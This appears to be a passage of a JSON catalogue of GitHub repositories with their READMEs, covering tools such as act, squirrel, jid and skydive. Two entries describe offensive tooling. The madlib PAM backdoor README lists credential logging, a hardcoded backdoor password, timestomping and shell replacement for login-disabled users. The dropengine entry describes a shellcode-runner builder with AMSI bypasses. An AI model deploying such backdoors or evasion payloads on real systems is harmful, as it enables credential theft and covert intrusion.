to container, rather than copy\\n -C, --directory string working directory (default \\\".\\\")\\n -n, --dryrun dryrun mode\\n --env-file string environment file to read (default \\\".env\\\")\\n -e, --eventpath string path to event JSON file\\n -h, --help help for act\\n -j, --job string run job\\n -l, --list list workflows\\n -P, --platform stringArray custom image to use per platform (e.g. -P ubuntu-18.04=nektos/act-environments-ubuntu:18.04)\\n -p, --pull pull docker image(s) if already present\\n -q, --quiet disable logging of output from steps\\n -r, --reuse reuse action containers to maintain state\\n -s, --secret stringArray secret to make available to actions with optional value (e.g. -s mysecret=foo or -s mysecret)\\n --secret-file file with list of secrets to read from (e.g. --secret-file .secrets)\\n -v, --verbose verbose output\\n --version version for act\\n -w, --watch watch the contents of the local repo and run when files change\\n -W, --workflows string path to workflow files (default \\\"./.github/workflows/\\\")\\n```\\n\\n# Known Issues\\n\\nMODULE_NOT_FOUND during `docker cp` command [#228](https://github.com/nektos/act/issues/228)\\n\\n```\\nsteps:\\n - name: Checkout\\n uses: actions/checkout@v2\\n with:\\n path: \\\"your-action-root-directory\\\"\\n```\\n\\n# Runners\\n\\nGitHub Actions offers managed [virtual environments](https://help.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners) for running workflows. In order for `act` to run your workflows locally, it must run a container for the runner defined in your workflow file. Here are the images that `act` uses for each runner type:\\n\\n| GitHub Runner | Docker Image |\\n| -------------- | ----------------------------------------------------------------- |\\n| ubuntu-latest | [node:12.6-buster-slim](https://hub.docker.com/_/buildpack-deps) |\\n| ubuntu-18.04 | [node:12.6-buster-slim](https://hub.docker.com/_/buildpack-deps) |\\n| ubuntu-16.04 | [node:12.6-stretch-slim](https://hub.docker.com/_/buildpack-deps) |\\n| windows-latest | `unsupported` |\\n| windows-2019 | `unsupported` |\\n| macos-latest | `unsupported` |\\n| macos-10.15 | `unsupported` |\\n\\n## Default runners are intentionally incomplete\\n\\nThese default images do **not** contain **all** the tools that GitHub Actions offers by default in their runners.\\n\\n## Alternative runner images\\n\\nIf you need an environment that works just like the corresponding GitHub runner then consider using an image provided by [nektos/act-environments](https://github.com/nektos/act-environments):\\n\\n- [nektos/act-environments-ubuntu:18.04](https://hub.docker.com/r/nektos/act-environments-ubuntu/tags) - built from the Packer file GitHub uses in [actions/virtual-environments](https://github.com/actions/runner).\\n\\n:warning: :elephant: `*** WARNING - this image is >18GB \\ud83d\\ude31***`\\n\\n## Use an alternative runner image\\n\\nTo use a different image for the runner, use the `-P` option:\\n\\n```\\nact -P ubuntu-latest=nektos/act-environments-ubuntu:18.04\\n```\\n\\n# Secrets\\n\\nTo run `act` with secrets, you can enter them interactively or supply them as environment variables. The following options are available for providing secrets:\\n\\n- `act -s MY_SECRET=somevalue` - use `somevalue` as the value for `MY_SECRET`.\\n- `act -s MY_SECRET` - check for an environment variable named `MY_SECRET` and use it if it exists. If the environment variable is not defined, prompt the user for a value.\\n\\n# Configuration\\n\\nYou can provide default configuration flags to `act` by either creating a `./.actrc` or a `~/.actrc` file. Any flags in the files will be applied before any flags provided directly on the command line. For example, a file like below will always use the `nektos/act-environments-ubuntu:18.04` image for the `ubuntu-latest` runner:\\n\\n```\\n# sample .actrc file\\n-P ubuntu-latest=nektos/act-environments-ubuntu:18.04\\n```\\n\\nAdditionally, act supports loading environment variables from an `.env` file. The default is to look in the working directory for the file but can be overridden by:\\n\\n```\\nact --env-file my.env\\n```\\n\\n# Events\\n\\nEvery [GitHub event](https://developer.github.com/v3/activity/events/types) is accompanied by a payload. You can provide these events in JSON format with the `--eventpath` to simulate specific GitHub events kicking off an action. For example:\\n\\n```pull-request.json\\n{\\n \\\"pull_request\\\": {\\n \\\"head\\\": {\\n \\\"ref\\\": \\\"sample-head-ref\\\"\\n },\\n \\\"base\\\": {\\n \\\"ref\\\": \\\"sample-base-ref\\\"\\n }\\n }\\n}\\n```\\n\\n```\\nact -e pull-request.json\\n```\\n\\nAct will properly provide `github.head_ref` and `github.base_ref` to the action as expected.\\n\\n# Support\\n\\nNeed help? Ask on [Gitter](https://gitter.im/nektos/act)!\\n\\n# Contributing\\n\\nWant to contribute to act? Awesome! Check out the [contributing guidelines](CONTRIBUTING.md) to get involved.\\n\\n## Building from source\\n\\n- Install Go tools 1.11.4+ - (https://golang.org/doc/install)\\n- Clone this repo `git clone git@github.com:nektos/act.git`\\n- Pull the default docker image `docker pull nektos/act-environments-ubuntu:18.04`\\n- Run unit tests with `make test`\\n- Build and install: `make install`\\n\"", "topics": ["ci", "devops", "github-actions", "golang"], "writeup": "", "ignoredescription": false, "id": 35, "full_name": "nektos/act", "url": "https://github.com/nektos/act"},
{"tags": [], "owner": "rek7", "description": "PAM Backdoor", "name": "madlib", "topics_string": "", "language": "Python", "readme": "\"# madlib\\n## Features: \\n* Logs username/passwords to file\\n* Obfuscates backdoor password with bcrypt (helps make reverse engineering more difficult and string dumps less effective)\\n* Automatically updates the DPKG MD5 hashes for all moved/replaced files\\n* Time stomps all moved/replaced files\\n* Replaces /bin/false, and /bin/nologin with /bin/bash (effectively making any user able to ssh in)\\n## Requirements:\\n* Requires Python3\\n* Root privileges needed\\n## Default Entries:\\n* Username/passwords by default are logged to /usr/include/type.h\\n* The default magic password is secretpassxd\\n\\n\\n## Usage\\n\\nManually Specifying PAM Version:\\n\\n```\\nroot@homebase /h/r/madlib# ./pam.py \\\"1.3.0\\\"\\n .___.__ ._____.\\n _____ _____ __| _/| | |__\\\\_ |__\\n / \\\\\\\\__ \\\\ / __ | | | | || __ \\\\\\n| Y Y \\\\/ __ \\\\_/ /_/ | | |_| || \\\\_\\\\ \\\\\\n|__|_| (____ /\\\\____ | |____/__||___ /\\n \\\\/ \\\\/ \\\\/ \\\\/\\n https://github.com/rek7/madlib/\\n[00:15:55] [+] PAM TAR Download Completed\\n[00:15:56] [+] Finishing Extracting\\n[00:15:56] [+] Added Backdoor\\n[00:16:16] [+] Finished Compiling Tainted Lib\\n[00:16:16] [+] Finished Successfully Compiled PAM File Moved to: '/lib/x86_64-linux-gnu/security/pam_unix.so'\\n```\\n\\nAutomatic Version Detection:\\n\\n```\\nroot@homebase /h/r/madlib# ./pam.py\\n .___.__ ._____.\\n _____ _____ __| _/| | |__\\\\_ |__\\n / \\\\\\\\__ \\\\ / __ | | | | || __ \\\\\\n| Y Y \\\\/ __ \\\\_/ /_/ | | |_| || \\\\_\\\\ \\\\\\n|__|_| (____ /\\\\____ | |____/__||___ /\\n \\\\/ \\\\/ \\\\/ \\\\/\\n https://github.com/rek7/madlib/\\n[00:17:55] [!] Detected PAM Version: '1.3.0'\\n[00:17:55] [+] PAM TAR Download Completed\\n[00:17:56] [+] Finishing Extracting\\n[00:17:56] [+] Added Backdoor\\n[00:18:16] [+] Finished Compiling Tainted Lib\\n[00:18:16] [+] Finished Successfully Compiled PAM File Moved to: '/lib/x86_64-linux-gnu/security/pam_unix.so'\\n```\\n\"", "topics": [], "writeup": "Python script to compile a PAM backdoor on to the system. Features include logging credentials, backdoor password, and automatic install.", "ignoredescription": false, "id": 36, "full_name": "rek7/madlib", "url": "https://github.com/rek7/madlib"},
{"tags": [], "owner": "s0lst1c3", "description": "DropEngine provides a malleable framework for creating shellcode runners, allowing operators to choose from a selection of components and combine them to create highly sophisticated payloads within seconds.", "name": "dropengine", "topics_string": "", "language": "Python", "readme": "\"![DropEngine](https://raw.githubusercontent.com/s0lst1c3/dropengine/master/DropEngine%201.png)\\n\\nby [@s0lst1c3](https://twitter.com/s0lst1c3)\\n\\nCurrent release: [v0.0.1-alpha](https://github.com/s0lst1c3/dropengine/releases/tag/v0.0.1-alpha)\\n\\nSupports _Python 3.7+_.\\n\\n# Overview\\n\\nDefense Evasion techniques tend to have a short shelf-life, and this is especially true for techniques used during initial access. Because of this, initial access payloads are often prepared on a per-engagement basis, which can be time-consuming when payloads are created entirely by hand. DropEngine addresses this problem by providing a malleable framework for creating shellcode runners, allowing operators to choose from a selection of components and combine them to create highly sophisticated payloads within seconds.\\n\\nAvailable payload components include crypters, execution and injection mechanisms, as well as environmental nad remote keying functions. Also included are pre-execution modules such as sandbox checks and AMSI bypasses. Although these pre-packaged example modules may prove useful, DropEngine's true strength is in its ability to improve operational efficiency by providing a high degree of payload standardization while simultaneously allowing operators to control just about every aspect of the payload's signature and behavior.\\n\\n# Disclaimer\\n\\nDropEngine (the \\\"Software\\\") and associated documentation is provided \\u201cAS IS\\u201d. The Developer makes no other warranties, express or implied, and hereby disclaims all implied warranties, including any warranty of merchantability and warranty of fitness for a particular purpose. Any actions or activities related to the use of the Software are the sole responsibility of the end user. The Developer will not be held responsible in the event that any criminal charges are brought against any individuals using or misusing the Software. It is up to the end user to use the Software in an authorized manner and to ensure that their use complies with all applicable laws and regulations.\\n\\n# Documentation\\n\\nAll documentation is available on the project's Wiki, which can be found here: https://github.com/s0lst1c3/dropengine/wiki\\n\\n# Contributing\\n\\nContributions are encouraged and more than welcome. Guidelines for creating pull requests and reporting issues can be found in [CONTRIBUTING.md](CONTRIBUTING.md).\\n\\n# Versioning\\n\\nWe use [SemVer](http://semver.org/) for versioning. For the versions available, see [https://github.com/s0lst1c3/dropengine/tags](https://github.com/s0lst1c3/dropengine/tags).\\n\\n# License\\n\\nThis project is licensed under the GNU Public License 3.0 - see the [LICENSE.md](LICENSE.md) file for details. \\n\\n# Acknowledgments\\nThis tool either builds upon, is inspired by, or directly incorporates nearly ten years of prior research and development from the following awesome people:\\n\\n* [@subtee](https://twitter.com/subtee)\\n* [secretsquirrel](https://github.com/secretsquirrel)\\n* [Antonio24](https://github.com/antonio24)\\n* [matterpreter](https://github.com/matterpreter)\\n* [dmchell](https://github.com/dmchell)\\n* [leoloobeek](https://github.com/leoloobeek) \\n* [Chris Truncer](https://twitter.com/christruncer)\\n* [Harmj0y](https://github.com/harmj0y)\\n* [byt3bl33d3r](https://github.com/byt3bl33d3r)\\n* [arvanaghi](https://github.com/arvanaghi)\\n\\nThis list will likely grow as additional functionality is added to the project.\\n\\nFor a complete description of what each of these people has contributed to the current payload development landscape and this tool, please see:\\n\\n* [https://github.com/s0lst1c3/dropengine/wiki/Acknowledgements](https://github.com/s0lst1c3/dropengine/wiki/Acknowledgements)\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 37, "full_name": "s0lst1c3/dropengine", "url": "https://github.com/s0lst1c3/dropengine"},
{"tags": ["sqlite", "cmdline", "go"], "owner": "schollz", "description": "Like curl, or wget, but downloads directly go to a SQLite databse", "name": "squirrel", "topics_string": "curl downloading sqlite3 wget sqlite cmdline go", "language": "Go", "readme": "\"\\n<p align=\\\"center\\\">\\n<img\\n src=\\\"\\\"\\n width=\\\"408px\\\" border=\\\"0\\\" alt=\\\"squirrel\\\">\\n<br>\\n<a href=\\\"https://github.com/schollz/squirrel/releases/latest\\\"><img src=\\\"https://img.shields.io/badge/version-v1.1.0-brightgreen.svg?style=flat-square\\\" alt=\\\"Version\\\"></a>\\n<a href=\\\"https://travis-ci.org/schollz/squirrel\\\"><img\\nsrc=\\\"https://img.shields.io/travis/schollz/squirrel.svg?style=flat-square\\\" alt=\\\"Build\\nStatus\\\"></a> \\n</p>\\n\\n\\n<p align=\\\"center\\\"><code>curl https://getsquirrel.schollz.com | bash</code></p>\\n\\n\\nDownloading the web can be cumbersome if you end up with thousands or millions of files. This tool allows you to download websites directly into a file-based database in SQLite, since [SQlite performs faster than a filesystem](https://www.sqlite.org/fasterthanfs.html) for reading and writing.\\n\\n\\n## Install\\n\\nDownload [the latest release for your system](https://github.com/schollz/squirrel/releases/latest), or install a release from the command-line:\\n\\n```\\n$ curl https://getsquirrel.schollz.com | bash\\n```\\n\\nOn macOS you can install the latest release with [Homebrew](https://brew.sh/): \\n\\n```\\n$ brew install schollz/tap/squirrel\\n```\\n\\nOr, you can [install Go](https://golang.org/dl/) and build from source (requires Go 1.11+): \\n\\n```\\n$ go get -v github.com/schollz/squirrel\\n```\\n\\n\\n\\n## Usage \\n\\n### Basic usage\\n\\nIt should be compatible with Firefox's \\\"Copy as cURL\\\", just replace `curl` with `squirrel`. By default it will save the data in a database, `urls.db`.\\n\\n```\\n$ squirrel \\\"https://www.sqlite.org/fasterthanfs.html\\\" -H \\\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\\\" -H \\\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\\" -H \\\"Accept-Language: en-US,en;q=0.5\\\" --compressed -H \\\"Referer: https://www.google.com/\\\" -H \\\"Connection: keep-alive\\\" -H \\\"Upgrade-Insecure-Requests: 1\\\" -H \\\"If-Modified-Since: Thu, 02 May 2019 16:25:06 +0000\\\" -H \\\"If-None-Match: \\\"\\\"m5ccb19e2s6076\\\"\\\"\\\" -H \\\"Cache-Control: max-age=0\\\"\\n```\\n\\n\\n## Contributing\\n\\nPull requests are welcome. Feel free to...\\n\\n- Revise documentation\\n- Add new features\\n- Fix bugs\\n- Suggest improvements\\n\\n## Thanks\\n\\nThanks Dr. H for the idea.\\n\\n## License\\n\\nMIT\\n\"", "topics": ["curl", "downloading", "sqlite3", "wget"], "writeup": "", "ignoredescription": false, "id": 38, "full_name": "schollz/squirrel", "url": "https://github.com/schollz/squirrel"},
{"tags": ["game"], "owner": "seanfisher", "description": "Play Codenames (the board game) online with friends. 4+ players required.", "name": "codenames", "topics_string": "board-game codenames expressjs nodejs socket-io typescript vue-cli vuejs game", "language": "TypeScript", "readme": "\"# Codenames\\n\\n[![Contributor Covenant](https://img.shields.io/badge/Contributor%20Covenant-v2.0%20adopted-ff69b4.svg)](CODE_OF_CONDUCT.md)\\n\\nPlay the board game Codenames online with friends.\\n\\n## Where to Play\\n\\nPlay at [http://playcodenamesonline.com](http://playcodenamesonline.com) or host this yourself!\\n\\n## Other implementations\\n\\nI love how there are many different versions of this, each with their own flair and style. Here are some links of other versions I've collected.\\n\\n- https://codenames.game - ***NEW*** The official implementation (in beta - looks like domain was registered May 5, 2020)\\n- https://www.horsepaste.com/ (https://github.com/jbowens/codenames)\\n- https://www.codenamesgreen.com/\\n- https://netgames.io/games/codenames\\n- http://those.codes/\\n- https://www.cyberspaces.app/cyberterms\\n- https://codewords.tv/\\n- https://captnemo.in/codenames/\\n- http://codenames.roartec.com/\\n- http://www.codenames.plus\\n- https://ninjabunny.github.io/KodeNames/\\n- https://kodenames.io\\n- http://www.codewordsgame.com\\n- https://playcodenames.online\\n- http://kodenym.com/\\n- https://hackervoiceim.in\\n- https://cnames.herokuapp.com\\n- https://en.codenames.me - seems broken\\n- https://codenames.dport.me/ - Codenames pictures\\n\\n## Project architecture\\n\\nFront-end:\\n- Vuejs scaffolded with @vue/cli\\n- Socket.io client\\n- Typescript/SASS/HTML\\n- Generally standard vue-cli project structure, with public files in `/public` and source files in `src/client`\\n\\nBack-end:\\n- Simple node.js Express server\\n- Socket.io server\\n- Server code is located in `src/server`\\n\\nShared:\\n- Typescript game models (located in `src/lib`)\\n\\nGame state is maintained on the server-side in Redis and commands are sent from the client to the server. The server processes the commands based on the current game state. A locking mechanism is used to ensure game state from Redis is not subject to race conditions. Any update from the game logic causes new state to be pushed to all currently connected players.\\n\\n## Running the project\\n\\n### Project setup\\n```\\nnpm install\\n```\\n\\n### Compiles and hot-reloads for development\\n```\\nnpm run serve:client\\nnpm run serve:server\\n```\\n\\n### Compiles and minifies for production\\n```\\nnpm run build:client\\nnpm run build:server\\n```\\n\\n### Run your unit tests\\n```\\nnpm run test:unit\\n```\\n\\n### Run your end-to-end tests\\n```\\nnpm run test:e2e\\n```\\n\\n### Lints and fixes files\\n```\\nnpm run lint\\n```\\n\\n### Deploying\\n\\nThis project can be run entirely on Heroku (for free). Configure a Heroku dyno with the Redis add-on, set up your local Heroku CLI to connect, then push the code to the Heroku machine (`git push heroku master`). Everything should just work. The dyno URL will serve the front-end and act as the back-end.\\n\\nThe client and server-side will automatically be built on Heroku using the package.json `heroku-postbuild` script.\\n\\n\\n## Code of Conduct\\n\\nPlease note that this project is released with a [Contributor Code of Conduct](CODE_OF_CONDUCT.md). By participating in this project you agree to abide by its terms.\\n\"", "topics": ["board-game", "codenames", "expressjs", "nodejs", "socket-io", "typescript", "vue-cli", "vuejs"], "writeup": "", "ignoredescription": false, "id": 39, "full_name": "seanfisher/codenames", "url": "https://github.com/seanfisher/codenames"},
{"tags": [], "owner": "sensepost", "description": "\ud83d\udcf1 objection - runtime mobile exploration", "name": "objection", "topics_string": "android framework frida instrumentation ios mobile pentest security", "language": "Python", "readme": "\"# \\ud83d\\udcf1objection - Runtime Mobile Exploration\\n\\n`objection` is a runtime mobile exploration toolkit, powered by [Frida](https://www.frida.re/), built to help you assess the security posture of your mobile applications, without needing a jailbreak.\\n\\n[![Twitter](https://img.shields.io/badge/twitter-%40leonjza-blue.svg)](https://twitter.com/leonjza)\\n[![PyPi](https://badge.fury.io/py/objection.svg)](https://pypi.python.org/pypi/objection)\\n[![Travis](https://travis-ci.org/sensepost/objection.svg?branch=master)](https://travis-ci.org/sensepost/objection)\\n[![Black Hat Arsenal](https://raw.githubusercontent.com/toolswatch/badges/master/arsenal/europe/2017.svg?sanitize=true)](https://www.blackhat.com/eu-17/arsenal-overview.html)\\n[![Black Hat Arsenal](https://raw.githubusercontent.com/toolswatch/badges/master/arsenal/usa/2019.svg?sanitize=true)](https://www.blackhat.com/us-19/arsenal-overview.html)\\n\\n<img align=\\\"right\\\" src=\\\"./images/objection.png\\\" height=\\\"220\\\" alt=\\\"objection\\\">\\n\\n- Supports both iOS and Android.\\n- Inspect and interact with container file systems.\\n- Bypass SSL pinning.\\n- Dump keychains.\\n- Perform memory related tasks, such as dumping & patching.\\n- Explore and manipulate objects on the heap.\\n- And much, much [more](https://github.com/sensepost/objection/wiki/Features)...\\n\\nScreenshots are available in the [wiki](https://github.com/sensepost/objection/wiki/Screenshots).\\n\\n## installation\\n\\nInstallation is simply a matter of `pip3 install objection`. This will give you the `objection` command. You can update an existing `objection` installation with `pip3 install --upgrade objection`.\\n\\nFor more detailed update and installation instructions, please refer to the wiki page [here](https://github.com/sensepost/objection/wiki/Installation).\\n\\n## license\\n\\n`objection` is licensed under a [GNU General Public v3 License](https://www.gnu.org/licenses/gpl-3.0.en.html). Permissions beyond the scope of this license may be available at [http://sensepost.com/contact/](http://sensepost.com/contact/).\\n\"", "topics": ["android", "framework", "frida", "instrumentation", "ios", "mobile", "pentest", "security"], "writeup": "objection is a runtime mobile exploration toolkit, powered by Frida, built to help you assess the security posture of your mobile applications, without needing a jailbreak.", "ignoredescription": true, "id": 40, "full_name": "sensepost/objection", "url": "https://github.com/sensepost/objection"},
{"tags": ["json", "cmdline"], "owner": "simeji", "description": "json incremental digger", "name": "jid", "topics_string": "cli go golang jid json tool json cmdline", "language": "Go", "readme": "\"# jid\\n\\n[![Circle CI](https://circleci.com/gh/simeji/jid/tree/master.svg?style=shield)](https://circleci.com/gh/simeji/jid/tree/master)\\n\\nJson Incremental Digger\\n\\nIt's a very simple tool. \\nYou can drill down JSON interactively by using filtering queries like [jq](https://stedolan.github.io/jq/).\\n\\n**Suggestion** and **Auto completion** of this tool will provide you a very comfortable JSON drill down.\\n\\n## Demo\\n\\n![demo-jid-main](https://github.com/simeji/jid/wiki/images/demo-jid-main-640-colorize.gif)\\n\\n## Installation\\n\\n* [With homebrew (for Mac)](#with-homebrew-for-mac) \\n* [With pkg (for FreeBSD)](#with-pkg-for-freebsd)\\n* [Other package management system](#other-package-management-systems)\\n* [Simply use \\\"jid\\\" command](#simply-use-jid-command) \\n* [Build](#build) \\n\\n### With homebrew (for Mac)\\n\\n```\\nbrew install jid\\n```\\n\\n### With pkg (for FreeBSD)\\n\\n```\\npkg install jid\\n```\\n\\n### Other package management systems\\n\\nJid can install by package management systems of below OS.\\n\\n[![Packaging status](https://repology.org/badge/vertical-allrepos/jid.svg)](https://repology.org/metapackage/jid/versions)\\n\\n\\n### Simply use \\\"jid\\\" command\\n\\nIf you simply want to use `jid` command, please download binary from below.\\n\\nhttps://github.com/simeji/jid/releases\\n\\n## Build\\n\\n```\\ngo get -u github.com/simeji/jid/cmd/jid\\n```\\n\\n## Usage\\n\\n### Quick start\\n\\n* [simple json example](#simple-json-example) \\n* [simple json example2](#simple-json-example2) \\n* [with initial query](#with-initial-query) \\n* [with curl](#with-curl) \\n\\n#### simple json example\\n\\nPlease execute the below command.\\n\\n```\\necho '{\\\"aa\\\":\\\"2AA2\\\",\\\"bb\\\":{\\\"aaa\\\":[123,\\\"cccc\\\",[1,2]],\\\"c\\\":321}}'| jid\\n```\\n\\nthen, jid will be running.\\n\\nYou can dig JSON data incrementally.\\n\\nWhen you enter `.bb.aaa[2]`, you will see the following.\\n\\n```\\n[Filter]> .bb.aaa[2]\\n[\\n 1,\\n 2\\n]\\n```\\n\\nThen, you press Enter key and output `[1,2]` and exit.\\n\\n#### simple json example2\\n\\nThis json is used by [demo section](https://github.com/simeji/jid#demo).\\n```\\necho '{\\\"info\\\":{\\\"date\\\":\\\"2016-10-23\\\",\\\"version\\\":1.0},\\\"users\\\":[{\\\"name\\\":\\\"simeji\\\",\\\"uri\\\":\\\"https://github.com/simeji\\\",\\\"id\\\":1},{\\\"name\\\":\\\"simeji2\\\",\\\"uri\\\":\\\"https://example.com/simeji\\\",\\\"id\\\":2},{\\\"name\\\":\\\"simeji3\\\",\\\"uri\\\":\\\"https://example.com/simeji3\\\",\\\"id\\\":3}],\\\"userCount\\\":3}}'|jid\\n```\\n\\n#### With a initial query\\n\\nFirst argument of `jid` is initial query.\\n(Use JSON same as [Demo](#demo))\\n\\n![demo-jid-with-query](https://github.com/simeji/jid/wiki/images/demo-jid-with-query-640.gif)\\n\\n#### with curl\\n\\nSample for using [RDAP](https://datatracker.ietf.org/wg/weirds/documents/) data.\\n\\n```\\ncurl -s http://rdg.afilias.info/rdap/domain/example.info | jid\\n```\\n\\n#### Load JSON from a file\\n\\n```\\njid < file.json\\n```\\n\\n## Keymaps\\n\\n|key|description|\\n|:-----------|:----------|\\n|`TAB` / `CTRL` + `I` |Show available items and choice them|\\n|`CTRL` + `W` |Delete from the cursor to the start of the word|\\n|`CTRL` + `U` |Delete whole query|\\n|`CTRL` + `F` / Right Arrow (:arrow_right:)|Move cursor a character to the right|\\n|`CTRL` + `B` / Left Arrow (:arrow_left:)|Move cursor a character to the left|\\n|`CTRL` + `A`|To the first character of the 'Filter'|\\n|`CTRL` + `E`|To the end of the 'Filter'|\\n|`CTRL` + `J`|Scroll json buffer 1 line downwards|\\n|`CTRL` + `K`|Scroll json buffer 1 line upwards|\\n|`CTRL` + `G`|Scroll json buffer to bottom|\\n|`CTRL` + `T`|Scroll json buffer to top|\\n|`CTRL` + `N`|Scroll json buffer 'Page Down'|\\n|`CTRL` + `P`|Scroll json buffer 'Page Up'|\\n|`CTRL` + `L`|Change view mode whole json or keys (only object)|\\n|`ESC`|Hide a candidate box|\\n\\n### Option\\n\\n|option|description|\\n|:-----------|:----------|\\n|First argument ($1) | Initial query|\\n|-h | print a help|\\n|-help | print a help|\\n|-version | print the version and exit|\\n|-q | Output query mode (for jq)|\\n|-M | monochrome output mode|\\n\"", "topics": ["cli", "go", "golang", "jid", "json", "tool"], "writeup": "Json Incremental Digger\nIt's a very simple tool. You can drill down JSON interactively by using filtering queries like jq.\nSuggestion and Auto completion of this tool will provide you a very comfortable JSON drill down.\n", "ignoredescription": false, "id": 41, "full_name": "simeji/jid", "url": "https://github.com/simeji/jid"},
{"tags": ["graph"], "owner": "skydive-project", "description": "An open source real-time network topology and protocols analyzer", "name": "skydive", "topics_string": "ebpf flow metrics monitoring network-topology networking packet-analyzer packet-sniffer pcap traffic-analysis traffic-monitoring graph", "language": "Go", "readme": "\"[![GitHub license](https://img.shields.io/badge/license-Apache%20license%202.0-blue.svg)](https://github.com/skydive-project/skydive/blob/master/LICENSE)\\n[![Slack Invite](https://img.shields.io/badge/Slack:-%23skydive&hyphen;project%20invite-blue.svg?style=plastic&logo=slack)](https://slack.skydive.network)\\n[![Slack Channel](https://img.shields.io/badge/Slack:-%23skydive&hyphen;project-blue.svg?style=plastic&logo=slack)](https://skydive-project.slack.com)\\n[![Weekly minutes](https://img.shields.io/badge/Weekly%20Meeting%20Minutes-Thu%2010:30am%20CEST-blue.svg?style=plastic)](https://docs.google.com/document/d/1eri4vyjmAwxiWs2Kp4HYdCUDWACF_HXZDrDL8WcPF-o/edit?ts=5d946ad5#heading=h.g8f8gdfq0un9)\\n[![Go Report Card](https://goreportcard.com/badge/github.com/skydive-project/skydive)](https://goreportcard.com/badge/github.com/skydive-project/skydive)\\n[![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/2695/badge)](https://bestpractices.coreinfrastructure.org/projects/2695)\\n[![StackShare](https://img.shields.io/badge/tech-stack-0690fa.svg?style=flat)](https://stackshare.io/skydive-project/skydive)\\n[![PyPI](https://img.shields.io/pypi/v/skydive-client.svg)](https://pypi.org/project/skydive-client/)\\n\\n# Skydive\\n\\nSkydive is an open source real-time network topology and protocols analyzer.\\nIt aims to provide a comprehensive way of understanding what is happening in\\nthe network infrastructure.\\n\\nSkydive agents collect topology information and flows and forward them to a\\ncentral agent for further analysis. All the information is stored in an\\nElasticsearch database.\\n\\nSkydive is SDN-agnostic but provides SDN drivers in order to enhance the\\ntopology and flows information.\\n\\n![](https://github.com/skydive-project/skydive.network/raw/images/overview.gif)\\n\\n## Key features\\n\\n* Captures network topology and flows\\n* Full history of network topology and flows\\n* Distributed\\n* Ability to follow a flow along a path in the topology\\n* Supports VMs and Containers infrastructure\\n* Unified query language for topology and flows (Gremlin)\\n* Web and command line interfaces\\n* REST API\\n* Easy to deploy (standalone executable)\\n* Connectors to OpenStack, Docker, OpenContrail, Kubernetes\\n\\n## Quick start\\n\\n### All-in-one\\n\\nThe easiest way to get started is to download the latest binary and to run it using the `all-in-one` mode :\\n\\n```console\\ncurl -Lo - https://github.com/skydive-project/skydive-binaries/raw/jenkins-builds/skydive-latest.gz | gzip -d > skydive && chmod +x skydive && sudo mv skydive /usr/local/bin/\\n\\nSKYDIVE_ETCD_DATA_DIR=/tmp SKYDIVE_ANALYZER_LISTEN=0.0.0.0:8082 sudo -E /usr/local/bin/skydive allinone\\n```\\n\\nOpen a browser to http://localhost:8082 to access the analyzer Web UI.\\n\\n### Docker\\n\\n```console\\ndocker run -d --privileged --pid=host --net=host -p 8082:8082 -p 8081:8081 \\\\\\n -e SKYDIVE_ANALYZER_LISTEN=0.0.0.0:8082 \\\\\\n -v /var/run/docker.sock:/var/run/docker.sock -v /run/netns:/var/run/netns \\\\\\n skydive/skydive allinone\\n```\\n\\nOpen a browser to http://localhost:8082 to access the analyzer Web UI.\\n\\n### Docker Compose\\n\\nTo quick set up a more complete working environment (with history support), [Docker Compose](https://docs.docker.com/compose/)\\ncan be used to automatically start an Elasticsearch container, a Skydive analyzer\\ncontainer and a Skydive agent container.\\n\\n```console\\ncurl -o docker-compose.yml https://raw.githubusercontent.com/skydive-project/skydive/master/contrib/docker/docker-compose.yml\\ndocker-compose up\\n```\\n\\nYou can also use the Skydive [command line client](https://skydive-project.github.io/skydive/getting-started/client/) with:\\n```console\\ndocker run --net=host -ti skydive/skydive client query \\\"g.V()\\\"\\n```\\n\\nOpen a browser to http://localhost:8082 to access the analyzer Web UI.\\n\\n## Documentation\\n\\nSkydive documentation can be found here:\\n\\n* http://skydive.network/documentation\\n\\nThe Skydive REST API is described using swagger [here](http://skydive.network/swagger).\\n\\n## Tutorials\\n\\nSkydive tutorials can be found here:\\n\\n* http://skydive.network/tutorials/first-steps-1.html\\n\\n## Get involved\\n\\n* Weekly meeting\\n * [General - Weekly meeting](https://meet.jit.si/skydive-project) - every Thursday at 10:30 - 11:30 AM CEST\\n * [Minutes](https://docs.google.com/document/d/1eri4vyjmAwxiWs2Kp4HYdCUDWACF_HXZDrDL8WcPF-o/edit?ts=5d946ad5#heading=h.g8f8gdfq0un9)\\n\\n* Slack\\n * Invite : https://slack.skydive.network\\n * Workspace : https://skydive-project.slack.com\\n\\n## Contributing\\n\\nYour contributions are more than welcome. Please check\\nhttps://github.com/skydive-project/skydive/blob/master/CONTRIBUTING.md\\nto know about the process.\\n\\n## License\\n\\nThis software is licensed under the Apache License, Version 2.0 (the\\n\\\"License\\\"); you may not use this software except in compliance with the\\nLicense.\\nYou may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0\\n\\nUnless required by applicable law or agreed to in writing, software\\ndistributed under the License is distributed on an \\\"AS IS\\\" BASIS,\\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\nSee the License for the specific language governing permissions and\\nlimitations under the License.\\n\"", "topics": ["ebpf", "flow", "metrics", "monitoring", "network-topology", "networking", "packet-analyzer", "packet-sniffer", "pcap", "traffic-analysis", "traffic-monitoring"], "writeup": "Skydive is an open source real-time network topology and protocols analyzer. It aims to provide a comprehensive way of understanding what is happening in the network infrastructure. Skydive agents collect topology information and flows and forward them to a central agent for further analysis. All the information is stored in an Elasticsearch database. Skydive is SDN-agnostic but provides SDN drivers in order to enhance the topology and flows information.\n", "ignoredescription": false, "id": 42, "full_name": "skydive-project/skydive", "url": "https://github.com/skydive-project/skydive"},
